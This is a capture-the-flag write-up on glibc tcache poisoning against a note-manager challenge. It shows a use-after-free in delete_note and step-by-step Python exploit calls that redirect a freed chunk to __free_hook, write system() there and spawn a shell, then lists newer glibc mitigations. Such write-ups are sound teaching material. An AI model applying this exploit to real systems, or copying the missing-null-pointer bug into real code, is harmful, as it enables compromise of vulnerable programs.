---
title: "Heap Exploitation — tcache Poisoning"
date: 2026-02-09
description: "Exploiting glibc tcache to get arbitrary write and overwrite __free_hook"
tags: ["ctf", "pwn", "heap"]
weight: 3
---

## Challenge: HeapNote

> Category: Pwn | Points: 500 | Solves: 8

A note manager with add/edit/delete/show. UAF (Use-After-Free) in delete — freed chunk pointers aren't nulled out.

## glibc tcache

Since glibc 2.26, freed chunks go to a per-thread cache (tcache) — a singly linked list per size class. No integrity checks in older versions.

```
tcache[0x20]:  chunk_A → chunk_B → NULL
```

## The Bug: Use-After-Free

```c
void delete_note(int idx) {
    free(notes[idx]);
    // notes[idx] = NULL;  // BUG: missing this line!
}
```

After `delete(0)`, `notes[0]` still points to the freed chunk. We can `edit(0)` to overwrite the tcache `fd` pointer.

## Exploit Steps

### 1. Setup

```python
add(0, 0x18, b"AAAA")  # chunk A
add(1, 0x18, b"BBBB")  # chunk B
```

### 2. Free and Poison

```python
delete(0)
delete(1)
# tcache[0x20]: chunk_B → chunk_A → NULL

# Overwrite chunk_B's fd to point to __free_hook
edit(1, p64(libc.sym['__free_hook']))
# tcache[0x20]: chunk_B → __free_hook → ???
```

### 3. Allocate Over __free_hook

```python
add(2, 0x18, b"CCCC")        # gets chunk_B (normal)
add(3, 0x18, p64(system))    # gets __free_hook! overwrites with system()
```

### 4. Trigger

```python
# edit any note to contain "/bin/sh\x00"
edit(0, b"/bin/sh\x00")
delete(0)  # free(notes[0]) → __free_hook(notes[0]) → system("/bin/sh")
```

```
$ cat flag.txt
FLAG{tc4ch3_p01s0n_g0t_sh3ll}
```

## Mitigations in Newer glibc

| glibc Version | Protection |
|---------------|-----------|
| 2.26-2.31 | No tcache checks (easy to exploit) |
| 2.32+ | `PROTECT_PTR` — fd XORed with heap address |
| 2.34+ | `__free_hook` removed entirely |

Modern exploitation requires more advanced techniques like House of XXX.
